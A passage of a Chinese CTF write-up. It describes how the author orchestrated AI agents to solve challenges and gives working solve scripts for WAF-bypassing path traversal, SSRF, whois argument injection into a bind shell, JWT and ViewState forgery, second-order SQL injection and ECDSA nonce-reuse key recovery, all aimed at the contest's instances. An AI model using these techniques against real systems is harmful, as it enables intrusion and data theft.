---
title: "THJCC CTF Summer 2026 writeup"
date: 2026-08-16
updated: 2026-08-16
tags:
  - CTF
description: "THJCC CTF Summer 2026 题解：40/46（Crypto/Pwn/Rev/Welcome 全清），4504 分、排名 14。多模型编排解题实录、六题未解复盘与全部 flag"
draft: false
---

# THJCC CTF Summer 2026 writeup

THJCC CTF Summer Edition 2026（2026-08-13 ~ 08-16 20:00 UTC+8，CTFd 平台，动态计分），
46 题解出 **40**：

| 分类 | 战绩 | 备注 |
|---|---|---|
| Crypto | **8/8** | 全清 |
| Pwn | **6/6** | 全清 |
| Reverse | **6/6** | 全清 |
| Web | 7/9 | 未解：The Archivist、Buggy web（均 0 解） |
| Misc | 7/10 | 未解：All night long（需认歌）、CTFxck、Shifting v2（paste 失效） |
| Forensics | 5/6 | 未解：Minecraft???（需 MC 客户端） |
| Welcome | 1/1 | |

最终 **4504 分、排名 14**（榜首 奶龍大冒險 6341 分）。动态计分的副作用是榜单下午整体通缩：解出的人越多，题分越低，最后几小时我们的分数从 5900+ 一路滑到 4504。

这篇记录的不仅是题解。和以往单模型一路打到底不同，这次是**编排式**：主 agent 只做
编排（侦察/派单/验收），全部解题由后台子 agent 流水线完成，多模态题外送 GPT。
40 题里我只亲手做了两道纯本地快题（Starry Sky、Baritone），其余 38 题是 138 个子 agent 会话的流水线派单加 GPT 两次出手的结果。怎么分工、踩了哪些坑、六道没解出来的题为什么没解出来，都写在前面，题解放后面。


---

## 一、模型怎么分的工

分工形态开头已经讲过，这里只给证据。比赛从 08-15 傍晚打到 08-16 20:00，主会话换了 5 个；模型段和切换点从各会话的运行记录逐段核对，再叠加各题 WRITEUP 的落盘时间戳交叉验证：

| 主会话 | 时段 | 模型段（请求 ×N） | 完成的题目 |
|---|---|---|---|
| 会话① | 08-15 16:20–16:50 | deepseek-v4-flash ×125 | 首次全量扫题尝试，被用户清空重来（产物未保留） |
| 会话② | 08-15 16:52–18:03 | deepseek-v4-flash ×117 | xorlocks、I ate something bad、Lattice of Doom、Because There is no one Make Reverse So I Create This Chal（reverse-chal）、Man!、A Little Penguin's Starry Sky Observation（第一批开局六题） |
| 会话② | 08-15 18:13–20:55 | **GLM-5.3 ×95** | 67jail、サイゼリヤ、Avatar Studio、Oracle of Padding、necropet、get-file1、déjà vu、A Million Messages |
| 会话② | 08-15 21:04–08-16 06:11 | deepseek-v4-flash ×104 | License、404、Nonce Sense、Afterimage2、TeaGod.exe、Canary Notes、Contoso（22:26 第二批上线后的夜场，通宵到早） |
| 会话②尾段 + 会话③④并行 | 08-16 06:11–11:36 | GLM-5.3 ×25 + deepseek-v4-flash ×157/×78 | TeaGod666、Chronicle、Schizophrenic Signer、NoNo、Bookworm、get-file2、Time Machine、BlackFrost、Very Security Shell、Who is Whois? 2、Forbidden、Two Exponents；**Starry Sky、Baritone 两道为主 agent 亲解**（纯本地快题） |
| 会话⑤（终局会话） | 08-16 11:23–20:53 | **GLM-5.3 ×233（主编排）** | Welcome（用户人眼 + GPT check-in）、SO EZ MISC（子 agent 第 3 轮）、SimpleNotes（子 agent 第 3 轮） |
| GPT（外部多模态） | 08-16 午后 | — | Afterimage1（mdat 孤立帧）、Where is our head（墨尔本双锚点）；All night long 未出 |

**子 agent 兵团**：138 个 subagent 会话，deepseek-v4-flash 68 个（4020 请求）、GLM-5.3 70 个（2830 请求）。每题一个 agent，时间盒 30-40 分钟，断点落盘、中断续派，滑窗保持 ≤3 并发（试过 6 并发，模型层连环故障）。未解题的消耗也值得一提：CTFxck 打了 10 轮，Buggy web 7 轮，The Archivist 5 轮，SO EZ MISC 和 SimpleNotes 各 3 轮，后两个第 3 轮破题。

> 术语：
> - **上下文压缩**＝主会话上下文超长时摘要续写，会话记录因此分段、模型归属按段核对；
> - **断点落盘**＝每轮把中间状态写进挑战目录 notes.md，按「已确凿的事实 / 当前假设与排除面 / 下一步（优先级）」分节滚动维护（如 ctfxck/notes.md 十轮、the-archivist/checkpoint_notes.md），中断可续、赛后可复盘；
> - **滑窗**＝保持固定并发数、一个 agent 结束立即补派；
> - **1308**＝账户级 5 小时请求配额上限（跨模型共享）；
> - **会话 ID**（b96110e4 等）＝本地会话编号，仅用于对照运行记录。

### 我给的 prompt（对照表，从会话记录提取）

| 时间 | 原始 prompt（摘录） | 响应的模型 |
|---|---|---|
| 08-15 16:20 | 完成 https://ctf2026-sum.thjcc.org/challenges 中所有的挑战，有什么需求轮子可以自己安装github（检索）/brew，并把你的解题思路记下来…… | deepseek-v4-flash |
| 08-15 16:48 | 清空下本地题目文件夹的内容，与相关的记忆。 | deepseek-v4-flash |
| 08-15 16:52 | # 任务：CTF 全量刷题（主 agent 编排模式）……（任务编排模板首版全文） | deepseek-v4-flash |
| 08-15 16:57 | 这是ctfd，应该有对应的token可以用 | deepseek-v4-flash |
| 08-15 18:15 | （上下文压缩后重注入任务模板） | GLM-5.3 ← 模型切换点 |
| 08-15 19:11 | 每次至多一个比赛题目环境吧？teagod我先停了，先做其他的？避免环境冲突？ | GLM-5.3 |
| 08-15 19:15 | rev，和pwn我理解简单点，还可以本地调试？ | GLM-5.3 |
| 08-15 19:21 | 密码题我理解也可以本地解决，多派几个agent解决下crypto。 | GLM-5.3 |
| 08-15 19:54 | 子agent貌似访问不到download，所以你派任务前，先把题目附件下好 | GLM-5.3（附件预下载制度由来） |
| 08-15 20:39 | 去掉容器的限制 | GLM-5.3（环境锁废除的前奏） |
| 08-15 21:07 | 现在又有token了，继续干！需要我的东西留到最后再搞。另外的，没有多模态额度了！ | deepseek-v4-flash ← 切回 |
| 08-15 22:26 | 先放着吧，看下有没有新题，也加到队列里，另外我去睡觉了，有问题收集起来我明天会看，应解尽解下。 | deepseek-v4-flash（通宵无人值守） |
| 08-16 06:11 | 结合我之前说的内容，更新下任务模板文件 | deepseek-v4-flash |
| 08-16 06:18 | 继续完成解题，优先做最可能完成的题目，对于多次没做出来的题目优先级降低些（放后面再做，避免卡进度）。 | GLM-5.3（b96110e4 开场） |
| 08-16 08:11 | agent放后台执行，有agent结束就派新的agent……避免等待5个agent全完成才派发下一批 | deepseek-v4-flash（滑窗流水线定稿） |
| 08-16 08:16 | 派子agent 模型用deepseek就行 | deepseek-v4-flash |
| 08-16 08:34 | 不要有lock，写到ctf prompt template中……一个容器锁会影响多个子agent解题 | deepseek-v4-flash（环境锁全面废除） |
| 08-16 10:10 | 让子agent去做，派的子agent少一点，就三个，不然容易限流 | deepseek-v4-flash（≤3 并发定稿） |
| 08-16 11:20 | 停止所有agent，后面让他们总结阶段性成果，我要交给下一个模型去干活了。 | deepseek-v4-flash |
| 08-16 11:23 | 继续完成解题，优先做最可能完成的题目……主agent调度，子agent干活，没有锁，最多三个子agent run在后台。 | GLM-5.3（终局会话 d3dc43ee 开场） |
| 08-16 12:0x | welcome做出来了，这是wp：……（Welcome 57 帧题解全文） | GLM-5.3 |
| 08-16 12:4x | 现在还有哪些难搞的需要多模态模型的题目？给我下，我等会让gpt搞一下 | GLM-5.3（GPT 外援通道开启） |
| 08-16 13:0x | 这些需要gpt（多模态）完成的题目你就不要再自己做了。把题目与相关需要交接的东西给到我就行 | GLM-5.3（三题移交定稿） |
| 08-16 14:1x | 这是干啥的？/tmp/thjcc-submit-lock。提交flag也弄个锁吗？不需要锁 | GLM-5.3（提交锁废除） |
| 08-16 14:2x | ctfd的平台应该有便捷的方式提交flag吧？比如apikey的openapi……给一个curl出来我让gpt自己验证去 | GLM-5.3（API token 交付 GPT） |
| 08-16 15:0x | 有配额了，继续让agent干！ | GLM-5.3（1308 重置后复场） |
| 08-16 15:2x | simplenotes不会有源码了，继续干他，不要太局限了，你看没源码也有解ssrf看看呢 | GLM-5.3（SimpleNotes 第 3 轮换论） |
| 08-16 19:3x | TL;DR 正确答案：THJCC{144.95,-37.81}……（GPT 两题完整 WP 回传） | GLM-5.3 |
| 08-16 19:5x | 两道web派子agent攻克下 | GLM-5.3（终局两路） |

> 归属方法注记：主会话的模型段与切换点按运行时间连续分段核对；用户 prompt
> 已过滤系统注入消息（待办提醒、子任务回报等）；题目归属 = WRITEUP 落盘时间
> 戳落在哪个模型段。早期记录在上下文压缩后有所缺失，以完整保存的记录为准。

### 几条被打磨出来的纪律

- **提交锁废除**：一开始按模板给 flag 提交加了个 mkdir 原子锁，被用户否了：多 agent 互相等锁只会互相阻塞。改成无锁，撞了平台限速就退避（CTFd 大约一分钟限 10 次，被限速的那次不算判定，sleep 8-10s 重发即可）。
- **配额墙**：账户级 5 小时请求上限（1308 次）跨模型共享，撞墙就停派等重置，空档期我自己做纯本地快题维持进度。
- **降级规则**：多轮打不动的题排到队尾。The Archivist、Buggy web、CTFxck 都是打满十轮上下后正式关闭，每轮断点全量落盘，等官方 writeup 对答案。
- **题面复核**：黑盒卡死先复查附件和题面有没有中途更新，这条抓到过两次关键情报（Buggy web 作者后挂了 4 条 hints，直接点明密码字段是 SQLi；CTFxck 题面补了解释器源码链接）。

### 官方 hints 的杠杆率

Buggy web 的 3 条免费 hint 加 1 条 50 分的付费 hint 全买了，情报质量确实高（账号固定在 DB、密码字段拼 SQL、DB 有个休眠函数）。结果 7 轮 ~350 个 payload 打下来，password 进的是**结果被丢弃的查询**，黑盒里根本没有 oracle 可依赖。买 hint 前得先想清楚它帮你排除了什么，又排除不了什么。

---

## 二、题解（40 题，每题附真实可运行的最小 POC）

每题代码即对应本地题目目录 `<slug>/solve.py`（或 solve.sh）的核心逻辑，
参数化可直接运行；纯人眼/OSINT 类题（Welcome、Where is our head、Penguin）注明
豁免与可复现部分。

> 说明：联网 POC（chal.thjcc.org 各端口）为赛时实例验证，赛后需自建环境或本地起题；离线可复现的题（Two Exponents、Lattice of Doom、License、404/xorlocks、BlackFrost、TeaGod.exe、Because…、Man!、Afterimage2、Starry Sky、Baritone、Welcome 抽帧、サイゼリヤ）开箱即跑。40 题 = 38 个条目：get-file1/get-file2 与 404/xorlocks 各合并为一条。**所有代码块默认折叠，按需点击展开。**

> **跨题套路·解码/归一/格式层差异判别法**（SimpleNotes 全角 hex、67jail NFKC 全角标识符、get-file1 小写 `location:`、Time Machine zip/tar symlink）：遇到"某种检查能过、另一种不过"时，先枚举输入会经过的所有层（URL 解码、tokenizer 归一、大小写折叠、归档格式解析…），对每层送一组对照输入（`%25` 编码、全角字符、大小写头、换归档格式），确定"哪层看不见什么"，再从层间差异下手。

### Web（7/9）


**SimpleNotes（Ghost Bits / BH Asia 2026）**
**Flag**：`THJCC{inspired_by_blackhat_asia_2026}`

前两轮证明了 `/api/read?f=` 在 ASCII 编码空间"数学密封"（WAF raw+解码双查
`../%2e/%2f`，应用单次 URLDecoder）。破口在**解码器字符集差异**：`URLDecoder`
的十六进制解析走 `Character.digit`，它接受**全角字符**：`%２ｅ` 解码出 `.`，
而 WAF 的 ASCII token 匹配完全看不见。

<details>
<summary>📜 SimpleNotes solve.py（56 行，核心 ghost_escape@149）——点击展开</summary>

```python
#!/usr/bin/env python3
"""SimpleNotes (THJCC CTF Summer 2026, Web) — 一键复现.

原理: 控制器对 f 做一次 java.net.URLDecoder.decode; 其十六进制解析走
Character.digit(char,16), 接受全角字符('２'->2, 'ｅ'->14, 'ｆ'->15),
故 "%２ｅ"->'.'、"%２ｆ"->'/', 而 WAF 只匹配 ASCII token "%2e/%2f/..".
传输约束: '%' 必须写成 %25, 全角字符必须 UTF-8 百分号编码(裸高位字节/裸%+非ASCII
均被 Tomcat 400).

用法: solve.py [base_url] [--depth N] [--target flag.txt]
"""
import argparse
import sys
import urllib.request

FW = {"2": "２", "e": "ｅ", "f": "ｆ", "E": "Ｅ", "F": "Ｆ"}


def ghost_escape(ch: str) -> str:
    """把 '.' 或 '/' 编码成 URLDecoder 能折叠、WAF 看不见的 %２ｅ/%２ｆ 形态."""
    hexpair = f"{ord(ch):02x}"          # '.' -> '2e', '/' -> '2f'
    body = "".join(FW[c] for c in hexpair)
    return "%25" + "".join(f"%{b:02X}" for b in body.encode("utf-8"))


def fetch(base: str, query: str) -> tuple[int, str]:
    url = f"{base.rstrip('/')}/api/read?{query}"
    try:
        with urllib.request.urlopen(url, timeout=10) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("base", nargs="?", default="http://chal.thjcc.org:12024")
    ap.add_argument("--depth", type=int, default=2, help="notes 目录深度(默认 2)")
    ap.add_argument("--target", default="flag.txt", help="根下目标文件名")
    a = ap.parse_args()

    code, body = fetch(a.base, "f=" + ghost_escape("."))
    print(f"[*] canary -> [{code}] {body.strip()!r} (期望 404 echo '.')")

    q = "f=" + (ghost_escape(".") * 2 + "/") * a.depth + ghost_escape("/") + a.target
    code, body = fetch(a.base, q)
    print(f"[*] traversal(depth={a.depth}) -> [{code}]")
    if code == 200 and body.startswith("THJCC{"):
        print(f"[+] {body.strip()}")
        sys.exit(0)
    print(f"[-] {body.strip()[:200]}  (尝试 --depth 1/2/3)")
    sys.exit(1)


if __name__ == "__main__":
    main()
```

</details>

**get-file1 / get-file2（SSRF 续作对）**
**Flag**：`THJCC{pHp_StReAm_30X_cAsE_43082ed528}` / `THJCC{PHP_stream_30x_DuAl_65de4980cf}`

v1 的 redirect 白名单用大小写敏感的 `str_starts_with('Location:')` 校验，redirector
发小写 `location:` 头即绕过，PHP stream 跟 3xx 不分大小写直达 flag host。v2 修了
这个但**只校验第一跳**，跟随链后续不查，内网端点直接吐 flag。

<details>
<summary>📜 get-file1 solve.py（33 行）——点击展开</summary>

```python
# ==== get-file1/solve.py ====
#!/usr/bin/env python3
"""get-file1 一键复现：SSRF + 小写 location 头绕过重定向白名单校验。

用法: python3 solve.py [host:port]
默认 chal.thjcc.org:8081。预期输出: THJCC{...}
"""
import sys, urllib.request, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "chal.thjcc.org:8081"

# r = redirector 的 compose 服务名（docker-compose.yml services.r）
# /a 端点用小写 'location' 头发出 302 -> http://flag.thjcc/flag.txt
payload = f"http://{TARGET}/file.php?u=http://r/a"

try:
    body = urllib.request.urlopen(payload, timeout=20).read().decode()
except urllib.error.HTTPError as e:
    body = e.read().decode()

print(f"[+] GET {payload}")
print(body.strip())

# 对照组：/b 用大写 'Location'，会被 file.php 的
# str_starts_with($v,'Location:') 手动校验抓住 -> 400 error
try:
    urllib.request.urlopen(f"http://{TARGET}/file.php?u=http://r/b", timeout=20).read()
    ctrl = "unexpected 200"
except urllib.error.HTTPError as e:
    ctrl = e.read().decode().strip()
print(f"[*] control /b (capital Location) -> {ctrl!r} (预期 'error')")
if "THJCC{" in body:
    print("[*] flag captured")
```

</details>

<details>
<summary>📜 get-file2 solve.sh（9 行）——点击展开</summary>

```bash
# ==== get-file2/solve.sh ====
#!/bin/bash
# get-file2 solve: SSRF to internal r/a which serves the flag directly.
# Usage: bash solve.sh [host] [port]
set -u
HOST="${1:-chal.thjcc.org}"
PORT="${2:-8082}"
curl -s -m 10 "http://${HOST}:${PORT}/file.php?u=http://r/a"
echo
```

</details>

**Who is Whois? 2**
**Flag**：`THJCC{Wh0_15_wH015???WH0_15_wh0_15:D}`

whois query 拼 argv，`-h`/`-p` 参数透传 = 任意 TCP SSRF → 内网全端口扫出
127.0.0.1:31337 的 bind shell（输入即执行）→ 跑 root 0711 的 `/flag` 可执行文件
直接吐 flag。

发现过程：`;`/`$()`/`` ` ``/`|` 全被滤，但 whois CLI 参数原样透传——`-h 127.0.0.1 -p 80 x` 回 "WHOIS connection failed." 实锤任意 TCP SSRF；对 127.0.0.1 全端口扫描只有 31337 回 `sh: 1: x: not found`——把每行输入当 shell 命令执行的 bind shell（redis 用户）。Redis 6379 路线被 rename-command 禁用 + Lua 沙箱封死，FTP/SMTP/SSH 是假服务。

<details>
<summary>📜 Who is Whois? 2 solve.sh（19 行）——点击展开</summary>

```bash
#!/bin/sh
# solve.sh — Who is Whois? 2 (THJCC CTF Summer 2026, Web, 500pts)
# 攻击链: whois CLI 参数注入（-h/-p）→ SSRF → 127.0.0.1:31337 bind shell（redis 用户）
#         → 执行 /flag（root 0711: 可执行不可读）→ 输出 flag
# 用法: bash solve.sh [HOST] [PORT]
# 依赖: curl, python3（解析 JSON）
set -u

HOST="${1:-chal.thjcc.org}"
PORT="${2:-5000}"
QUERY='-h 127.0.0.1 -p 31337 /flag'

echo "[*] WHOIS SSRF payload: ${QUERY}"
RESP=$(curl -sk --max-time 15 -X POST "http://${HOST}:${PORT}/whois" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":\"${QUERY}\"}")

FLAG=$(echo "${RESP}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("output","").strip())')
echo "[+] Flag: ${FLAG}"
```

</details>

**Avatar Studio**
**Flag**：`THJCC{local_test_flag_not_the_real_one}`

JWT kid 相对路径 `../` 穿越（`startswith("/")` 只拦绝对路径）到 `/.git/HEAD`
已知内容做 HS256 密钥 → 伪造 admin token。

发现过程：`/.git/<path>` 显式路由先泄漏全部源码——`load_key(kid)` 只拦 NUL 与 `/` 开头，`os.path.join` 不解析 `..`；线上 `.git/HEAD` 内容已知（`ref: refs/heads/master`），kid=`../.git/HEAD` 就把"任意已知内容文件"变成 HMAC 密钥。`/panel-legacy` 的假 flag 诱饵平台判 incorrect。

<details>
<summary>📜 Avatar Studio solve.py（71 行，核心 forge@291）——点击展开</summary>

```python
#!/usr/bin/env python3
"""Avatar Studio - one-shot solve.

Vuln chain (from .git leak source, app.py):
  load_key(kid) only blocks NUL bytes and leading "/" -- os.path.join(KEY_DIR, kid)
  still allows "../" traversal, so ANY file with known content can serve as the
  HMAC-SHA256 signing key. The app itself serves /.git/<path> verbatim, so we can
  read .git/HEAD bytes live and use kid="../.git/HEAD" to forge an admin JWT.

Usage: solve.py BASE_URL   (instance URL from the CTF-Instancer, e.g. http://chal.thjcc.org:<port>)
"""
import base64
import hashlib
import hmac
import json
import sys
import urllib.request

if len(sys.argv) < 2:
    sys.exit("usage: solve.py BASE_URL  (your instancer-provided instance URL)")
BASE = sys.argv[1].rstrip("/")


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(data: str) -> bytes:
    return base64.urlsafe_b64decode(data + "=" * (-len(data) % 4))


def forge(kid: str, payload: dict, key: bytes) -> str:
    header = {"alg": "HS256", "typ": "JWT", "kid": kid}
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(key, f"{h}.{p}".encode(), hashlib.sha256).digest()
    return h + "." + p + "." + b64url(sig)


def get(path: str, cookie: str = None) -> tuple[int, bytes]:
    req = urllib.request.Request(BASE + path)
    if cookie:
        req.add_header("Cookie", cookie)
    try:
        r = urllib.request.urlopen(req, timeout=10)
        return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


# 1. pull exact key material from the app's own .git route
status, head_bytes = get("/.git/HEAD")
assert status == 200, f".git/HEAD fetch failed: {status}"
print(f"[*] .git/HEAD = {head_bytes!r}")

# 2. forge admin token with that file as the HMAC key
payload = {"username": "admin", "role": "admin"}
token = forge("../.git/HEAD", payload, head_bytes)
print(f"[*] forged token = {token}")

# 3. claim the flag
status, body = get("/admin", f"session={token}")
print(f"[*] /admin -> {status}")
text = body.decode(errors="replace")
import re
m = re.search(r"THJCC\{[^}]*\}", text)
if m:
    print(f"[+] FLAG: {m.group(0)}")
else:
    print(text[:500])
    sys.exit(1)
```

</details>

**Bookworm（二阶 SQLi）**
**Flag**：`THJCC{s3c0nd_0rd3r_b00kw0rm_9f3a1c}`

注册参数化安全入库，`/generate_report` 后台线程字符串拼接
`WHERE username='...'` 二次查询引爆；CSV 报告行有无 = 布尔 oracle。存储 XSS
是诱饵（无 bot）。

<details>
<summary>📜 Bookworm solve.py（87 行，核心 sqli_report@402）——点击展开</summary>

```python
#!/usr/bin/env python3
"""Bookworm (THJCC CTF Summer 2026) — second-order SQLi via async report thread.

Usage:
    python3 solve.py --host chal.thjcc.org --port 31263

Chain:
  1. register a user whose username is a SQL payload (all main routes are
     safely parameterized, the payload just sits in the users table)
  2. POST /generate_report -> the *background thread* later runs
     SELECT title,author,rating FROM books WHERE username='<payload>'
     with string concatenation -> second-order SQL injection
  3. the generated CSV report is the exfil channel (UNION results appear
     as book rows); a crashed thread = no report row at all (boolean oracle)
"""
import argparse
import re
import sys
import time

import requests

FLAG_TABLE_B64 = "bjB0aDFuZ190MF9zMzNfaDNyMw=="  # decodes to n0th1ng_t0_s33_h3r3

DUMPS = [
    ("tables",
     "x' UNION SELECT 1,(SELECT group_concat(name) FROM sqlite_master "
     "WHERE type='table'),3-- "),
    ("hidden-schema",
     "y' UNION SELECT 1,(SELECT sql FROM sqlite_master "
     "WHERE name LIKE 'bjB0%'),3-- "),
    ("flag",
     "z1' UNION SELECT (SELECT name||' == '||value FROM "
     f"\"{FLAG_TABLE_B64}\"),2,3-- "),
]


def sqli_report(base, payload, idx):
    """Register payload-username, trigger async report, return CSV text."""
    s = requests.Session()
    user = payload  # full payload must survive: usernames >64 chars are accepted
    s.post(f"{base}/signup", data={"username": user, "email": "e@e.com",
                                   "password": "Pw12345!"}, timeout=10)
    r = s.post(f"{base}/login", data={"username": user,
                                      "password": "Pw12345!"}, timeout=10)
    if "Logout" not in r.text:
        print("[-] login failed (username rejected?)", file=sys.stderr)
        return None
    s.post(f"{base}/shelf", data={"title": "mk", "author": "a",
                                  "rating": "3"}, timeout=10)
    s.post(f"{base}/generate_report", timeout=10)
    for _ in range(6):  # async thread writes the row ~1-4s later
        time.sleep(2)
        inbox = s.get(f"{base}/inbox", timeout=10).text
        ids = re.findall(r"/download_report/(\d+)", inbox)
        if ids:
            return s.get(f"{base}/download_report/{max(ids, key=int)}",
                         timeout=10).text
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, required=True)
    args = ap.parse_args()
    base = f"http://{args.host}:{args.port}"

    for tag, payload in DUMPS:
        print(f"[+] dumping: {tag}")
        csv = sqli_report(base, payload, tag)
        if csv is None:
            print("    (thread crashed or no report -> payload rejected)")
            continue
        for line in csv.splitlines():
            if (line.startswith(("mk,", '"mk')) or "script" in line.lower()
                    or line == "title,author,rating" or line in (",2,3", "1,2,3")):
                continue
            print("   ", line[:300])
            m = re.search(r"(THJCC\{[^}]+\})", line)
            if m:
                print("\n[+] FLAG:", m.group(1))
                return


if __name__ == "__main__":
    main()
```

</details>

**Contoso Asset Portal**
**Flag**：`THJCC{f0rg3d_v13wst4t3_w1th_l34k3d_m4ch1n3k3y}`

`/backup/2024-legacy-web.config~` 泄漏未轮换 machineKey → 重算 HMACSHA1 伪造
`role=admin` + restricted asset 的 ViewState（ObjectStateFormatter 载荷）。

发现过程：`Server: Mono-HTTPAPI/1.0` + 页面注释锁定 ASP.NET 2.0/Mono；ViewState 解码为 `FF 01 0C | 01 05 "guest" | 01 0B "AST-0000000"` + 20 字节 MAC，篡改任一字节即 500（MAC 启用）→ 必须搞到 machineKey；`/robots.txt` → `/backup/` 目录列表泄漏 `2024-legacy-web.config~`（注释明说 "keys were NOT rotated"）与 `assets.csv.bak`（唯一 restricted 资产 AST-4F2A9C0）；用泄漏 key 对原始 payload 重算 HMACSHA1 与尾部 20 字节比对一致，确认算法后伪造。

<details>
<summary>📜 Contoso Asset Portal solve.py（57 行，核心 forge_viewstate@498）——点击展开</summary>

```python
#!/usr/bin/env python3
"""Contoso Asset Portal — ViewState MAC forgery solve script.

Chain:
  1. /robots.txt -> /backup/ -> 2024-legacy-web.config~ leaks the production
     machineKey validationKey (SHA1, unrotated).
  2. Default.aspx keeps session state (role, asset) inside __VIEWSTATE,
     serialized as Pair(role, asset) via ObjectStateFormatter (Mono).
  3. Rebuild the serialized payload with role=admin, asset=AST-4F2A9C0
     (the 'restricted' row in assets.csv.bak) and append a valid
     HMACSHA1(validationKey, payload) MAC -> flag is returned.

Usage: python3 solve.py [base_url]
"""
import base64
import hashlib
import hmac
import re
import sys
import urllib.parse
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://chal.thjcc.org:31257"
PAGE = BASE + "/Default.aspx"

# Leaked from /backup/2024-legacy-web.config~ (comment: "keys were NOT rotated")
VALIDATION_KEY = bytes.fromhex(
    "F3690E7A9D8F4C2B1A5E6D7C8B9A0F1E2D3C4B5A69788796A5B4C3D2E1F0A9B8"
    "C7D6E5F4A3B2C1D0E9F8A7B6C5D4E3F2A1B0C9D8E7F6A5B4C3D2E1F0A9B8"
)

ROLE = "admin"
ASSET = "AST-4F2A9C0"  # Domain Controller, classification=restricted


def forge_viewstate(role, asset):
    """Rebuild ObjectStateFormatter payload: FF 01 <type=0x0C Pair> <str> <str>."""
    rb, ab = role.encode(), asset.encode()
    payload = bytes([0xFF, 0x01, 0x0C, 0x01, len(rb)]) + rb + bytes([0x01, len(ab)]) + ab
    mac = hmac.new(VALIDATION_KEY, payload, hashlib.sha1).digest()
    return base64.b64encode(payload + mac).decode()


def main():
    vs = forge_viewstate(ROLE, ASSET)
    data = urllib.parse.urlencode({"q": "", "__VIEWSTATE": vs}).encode()
    req = urllib.request.Request(PAGE, data=data)
    with urllib.request.urlopen(req, timeout=20) as resp:
        body = resp.read().decode(errors="replace")
    m = re.search(r"<code>(THJCC\{[^<]*\})</code>", body)
    if not m:
        sys.exit("flag not found in response:\n" + body[:500])
    print(m.group(1))


if __name__ == "__main__":
    main()
```

</details>

### Crypto（8/8）

**Nonce Sense**
**Flag**：`THJCC{n3v3r_3v3r_r3us3_th3_s4m3_n0nc3}`

secp256k1 ECDSA 双签名共享 nonce：k=(z1−z2)/(s1−s2)。

<details>
<summary>📜 Nonce Sense solve.py（148 行，核心 recover_key@585）——点击展开</summary>

```python
#!/usr/bin/env python3
"""Nonce Sense (THJCC Summer 2026) — ECDSA/secp256k1 nonce-reuse solver.

Protocol observed:
  PUB  <x(32B hex)> <y(32B hex)>             # uncompressed secp256k1 pubkey
  SIG  <msg hex> <r(32B hex)> <s(32B hex)>   # two sigs share r => same nonce k
  TARGET <msg hex>                           # message we must sign

Attack:
  k  = (z1 - z2) / (s1 - s2) mod n          (z_i = SHA256(msg_i))
  d  = (s1*k - z1) / r mod n
  then sign TARGET with a fresh nonce.
"""
import hashlib
import os
import re
import socket
import sys

# ---- secp256k1 constants ----
P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
GX = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
GY = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8


def point_add(A, B):
    if A is None:
        return B
    if B is None:
        return A
    x1, y1 = A
    x2, y2 = B
    if x1 == x2 and (y1 + y2) % P == 0:
        return None
    if A == B:
        lam = (3 * x1 * x1) * pow(2 * y1, -1, P) % P
    else:
        lam = (y2 - y1) * pow((x2 - x1) % P, -1, P) % P
    x3 = (lam * lam - x1 - x2) % P
    y3 = (lam * (x1 - x3) - y1) % P
    return (x3, y3)


def point_mul(k, base=(GX, GY)):
    R = None
    Q = base
    while k:
        if k & 1:
            R = point_add(R, Q)
        Q = point_add(Q, Q)
        k >>= 1
    return R


def recover_key(pub, r, s1, s2, m1, m2):
    z1 = int.from_bytes(hashlib.sha256(m1).digest(), "big")
    z2 = int.from_bytes(hashlib.sha256(m2).digest(), "big")
    k = (z1 - z2) * pow((s1 - s2) % N, -1, N) % N
    Rk = point_mul(k)
    assert Rk[0] % N == r, "nonce recovery failed"
    d = (s1 * k - z1) * pow(r, -1, N) % N
    assert point_mul(d) == pub, "pubkey mismatch"
    return d, k


def sign(d, msg, nonce=None):
    z = int.from_bytes(hashlib.sha256(msg).digest(), "big")
    while True:
        k = nonce if nonce is not None else int.from_bytes(os.urandom(32), "big") % N
        if k == 0:
            k = None
            continue
        R = point_mul(k)
        r = R[0] % N
        if r == 0:
            k = None
            continue
        s = pow(k, -1, N) * (z + r * d) % N
        if s == 0:
            k = None
            continue
        return r, s


def main():
    sock = socket.create_connection(("chal.thjcc.org", 12001), timeout=10)
    sock.settimeout(10)
    data = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
        if data.count(b"\n") >= 4:  # banner done after TARGET line
            break
    text = data.decode(errors="replace")
    print("[*] server banner:")
    print(text)

    lines = text.strip().splitlines()
    pub = None
    sigs = []
    target = None
    for ln in lines:
        parts = ln.split()
        if parts[0] == "PUB":
            pub = (int(parts[1], 16), int(parts[2], 16))
        elif parts[0] == "SIG":
            sigs.append((bytes.fromhex(parts[1]), int(parts[2], 16), int(parts[3], 16)))
        elif parts[0] == "TARGET":
            target = bytes.fromhex(parts[1])
    assert pub and len(sigs) >= 2 and target is not None

    m1, r1, s1 = sigs[0]
    m2, r2, s2 = sigs[1]
    assert r1 == r2, "signatures do not share nonce"
    print(f"[+] live values: shared r={r1:x}, s1={s1:x}, s2={s2:x}")

    d, k_reuse = recover_key(pub, r1, s1, s2, m1, m2)
    print(f"[+] recovered private key d = {d:x}")

    rr, ss = sign(d, target, nonce=k_reuse)
    sig_line = f"{rr:064x} {ss:064x}"
    print(f"[+] crafted (r=s, nonce reused): {sig_line}")

    sock.sendall((sig_line + "\n").encode())
    reply = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            reply += chunk
    except socket.timeout:
        pass
    print("[*] server reply:")
    print(reply.decode(errors="replace"))
    sock.close()

